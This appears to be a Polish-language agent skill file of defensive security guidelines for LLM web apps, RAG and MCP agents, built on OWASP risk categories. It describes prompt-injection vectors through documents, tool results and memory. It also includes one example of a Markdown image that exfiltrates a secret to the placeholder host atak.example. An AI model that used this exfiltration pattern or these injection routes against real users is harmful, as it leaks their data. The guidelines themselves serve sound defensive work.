---
name: ai-web-security
description: Wytyczne bezpieczeństwa dla aplikacji WWW wykorzystujących AI – czaty, asystenci, wyszukiwanie RAG, agenci z narzędziami i serwery MCP. Używaj przy projektowaniu, implementacji, code review i audycie każdej funkcji, w której model językowy przyjmuje dane od użytkownika, czyta treści zewnętrzne, wywołuje narzędzia lub zwraca wynik renderowany w przeglądarce albo przekazywany do backendu. Oparte na OWASP Top 10 for LLM Applications 2026 i OWASP Top 10 for Agentic Applications 2026.
version: 1.0.0
updated: 2026-09-24
---

# Bezpieczeństwo AI w aplikacjach WWW

## Zasada nadrzędna

Model językowy jest **niezaufanym komponentem**. Wszystko, co trafia do modelu (wiadomość użytkownika, dokumenty, wyniki narzędzi, pamięć, obrazy), może zawierać instrukcje atakującego. Wszystko, co wychodzi z modelu, traktuj jak dane wprowadzone przez anonimowego użytkownika. Bezpieczeństwo musi wynikać z **deterministycznego kodu wokół modelu**, a nie z treści system promptu.

## Kiedy stosować

- Dodawanie lub zmiana czatu, asystenta, widgetu wsparcia, generatora treści, wyszukiwarki semantycznej.
- Podłączanie modelu do bazy danych, API, poczty, plików, płatności, zamówień, CMS.
- Implementacja lub integracja serwera/klienta MCP, function calling, agentów.
- Code review i audyt przed wdrożeniem funkcji AI.

## Procedura pracy agenta

1. **Zidentyfikuj architekturę**: skąd przychodzą dane do modelu (źródła zaufane/niezaufane), jakie narzędzia ma model, gdzie trafia wynik (HTML, SQL, shell, e-mail, inny agent). Narysuj granice zaufania.
2. **Przejdź przez checklistę** `references/review-checklist.md` – każda pozycja: spełnione / nie dotyczy / luka.
3. **Dla każdej luki** podaj: ID ryzyka (np. `LLM01:2026`, `ASI02`), plik i linię, scenariusz ataku, konkretną poprawkę w kodzie.
4. **Nie zgłaszaj** jako zabezpieczenia samych instrukcji w system prompcie („nie ujawniaj…”, „ignoruj polecenia…”). To nie jest kontrola bezpieczeństwa.
5. **Priorytetyzuj**: Krytyczne (wykonanie akcji/kodu, wyciek danych innych użytkowników, sekrety w kontekście) → Wysokie (XSS z odpowiedzi modelu, brak limitów kosztów, RAG bez izolacji tenantów) → Średnie → Niskie.

## Reguły obowiązkowe (MUST)

### Wejście i kontekst – LLM01 Prompt Injection, LLM08 Hidden Context Exposure
- System prompt jest **statyczny**. Nigdy nie interpoluj do niego treści od użytkownika ani z RAG/narzędzi.
- Treści niezaufane (dokumenty, strony www, wyniki narzędzi, e-maile) przekazuj w wyraźnie oznaczonym bloku danych, oddzielnie od instrukcji.
- **Żadnych sekretów w kontekście modelu**: kluczy API, haseł, connection stringów, wewnętrznych URL-i, reguł autoryzacji. Zakładaj, że cały kontekst może zostać ujawniony użytkownikowi.
- Normalizuj wejście: usuwaj znaki zero-width, znaki sterujące, niewidoczny Unicode (tagi U+E0000–U+E007F, bidi); ogranicz długość wiadomości i historii.
- Pamięć długoterminowa i zapisy do RAG są wektorem trwałej infekcji – waliduj je i izoluj per użytkownik.

### Autoryzacja i agencja – LLM03 Excessive Agency, ASI02/ASI03
- Autoryzacja jest egzekwowana **w kodzie backendu**, w kontekście zalogowanego użytkownika – nigdy przez model.
- Minimalny zestaw narzędzi, minimalna funkcjonalność narzędzi, minimalne uprawnienia (osobny użytkownik DB tylko z `SELECT` na potrzebnych widokach).
- Zakaz narzędzi otwartych: dowolny shell, dowolne SQL, dowolny URL fetch, dowolny zapis pliku. Zamiast tego wąskie funkcje ze ścisłym schematem parametrów walidowanym po stronie serwera.
- Akcje nieodwracalne lub finansowe (usunięcie, płatność, zmiana zamówienia, wysłanie maila, zmiana uprawnień) wymagają **potwierdzenia człowieka**, które pokazuje surową operację i parametry, a nie streszczenie wygenerowane przez model.
- Identyfikator użytkownika/tenanta pochodzi z sesji serwera, nigdy z argumentów wygenerowanych przez model.

### Wyjście – LLM10 Improper Output Handling
- Odpowiedź modelu przed wyświetleniem: **escapowanie kontekstowe** lub renderowanie Markdown przez sanityzer z allowlistą (np. DOMPurify). Nigdy `innerHTML` z surowym wynikiem.
- Domyślnie **wyłącz automatyczne ładowanie obrazów Markdown, iframe, podglądów linków** – to kanał eksfiltracji danych (`![](https://atak.example/?d=SEKRET)`). Obrazy tylko z allowlisty domen lub przez proxy serwera.
- Wynik modelu trafiający do SQL – wyłącznie zapytania parametryzowane. Do shella – nigdy. Do `eval`, szablonów, deserializacji – nigdy.
- Usuwaj sekwencje ANSI i znaki sterujące przed zapisem do logów/terminala.
- Rygorystyczny CSP (`script-src` bez `unsafe-inline`, `img-src` z allowlistą, `connect-src` ograniczony).

### Dane wrażliwe – LLM02 Sensitive Information Disclosure
- **Autoryzuj przed pobraniem**, a nie filtruj po wygenerowaniu. RAG i narzędzia zwracają tylko rekordy, do których użytkownik ma prawo.
- Minimalizuj dane wysyłane do dostawcy modelu (PII, dane klientów, dane płatnicze). Maskuj przed wysłaniem, jeśli nie są niezbędne.
- Traktuj jako kanały wycieku także: argumenty wywołań narzędzi, logi, telemetrię, cache, komunikaty błędów.
- Sprawdź umowę/ustawienia dostawcy: retencja danych, trenowanie na danych, region przetwarzania (RODO).

### RAG i wektory – LLM09 Vector and Embedding Weaknesses
- Filtr tenanta/uprawnień **wewnątrz zapytania do indeksu**, po stronie serwera; nie jako post-filtr.
- Rozdzielone indeksy dla treści o różnym poziomie zaufania (publiczne / wewnętrzne / od użytkowników).
- Proweniencja każdego fragmentu (źródło, data, wersja pipeline'u); usuwanie embeddingów przy usunięciu dokumentu.
- Nie zwracaj klientowi surowych wyników podobieństwa.

### Koszty i dostępność – LLM06 Unbounded Consumption
- Limity per użytkownik/IP/klucz: zapytania, tokeny na minutę i dobę, **twardy limit kosztu** zatrzymujący inferencję.
- Limit długości wejścia i wyjścia (`max_tokens`), timeouty, limit kroków pętli agenta i liczby wywołań narzędzi.
- CAPTCHA/uwierzytelnienie dla publicznych czatów; ochrona przed botami.

### Łańcuch dostaw – LLM04, LLM05, ASI04
- Przypięte wersje SDK, bibliotek i modeli; weryfikacja sum kontrolnych. Serwery MCP i skille tylko z zaufanych źródeł, po przeglądzie kodu.
- Formaty modeli bez wykonywania kodu (safetensors zamiast pickle).
- Inwentarz AI (AIBOM): modele, dostawcy, narzędzia, serwery MCP, poświadczenia.

### Dezinformacja – LLM07 Misinformation
- Odpowiedzi wpływające na decyzje (ceny, stany, statusy zamówień, prawo, zdrowie) pochodzą z danych systemu, nie z „wiedzy” modelu. Model tylko formułuje odpowiedź na podstawie przekazanych faktów.
- Wyraźne oznaczenie treści generowanych przez AI (także wymóg AI Act dla czatów).

### Obserwowalność
- Loguj: identyfikator użytkownika, sesję, wywołania narzędzi z parametrami, decyzje polityk, blokady, zużycie tokenów. Nie loguj pełnych sekretów ani zbędnych danych osobowych.
- Alerty: nagły wzrost kosztów, powtarzające się próby injection, nietypowe sekwencje narzędzi.

## Materiały szczegółowe

| Plik | Zakres |
|---|---|
| `references/llm-chat-web.md` | Czat/asystent w przeglądarce: architektura, frontend, backend proxy, streaming |
| `references/agents-tools-mcp.md` | Agenci, function calling, MCP, OWASP Agentic Top 10 (ASI01–ASI10) |
| `references/rag-vectors.md` | RAG, embeddingi, pgvector, ingest dokumentów |
| `references/web-hardening.md` | Klasyczne bezpieczeństwo WWW wokół funkcji AI: nagłówki, sesje, CSRF, CORS, rate limiting |
| `references/stack-perl-node.md` | Wzorce kodu: Perl (Mojolicious/Dancer/CGI), Node.js (Express/Fastify), PostgreSQL, MariaDB, Apache |
| `references/testing-redteam.md` | Testy bezpieczeństwa, przypadki testowe prompt injection, narzędzia |
| `references/review-checklist.md` | Checklista do code review i audytu przed wdrożeniem |
| `SOURCES.md` | Źródła i daty weryfikacji |

## Format raportu z przeglądu

```
## Podsumowanie
Architektura: <krótko>. Wynik: X krytycznych, Y wysokich, Z średnich.

## Ustalenia
### [KRYTYCZNE] <tytuł> — LLM03:2026 / ASI02
Lokalizacja: path/file.pm:120
Scenariusz: <jak atakujący to wykorzysta>
Poprawka: <konkretny kod lub zmiana konfiguracji>

## Spełnione kontrole
<lista>
```
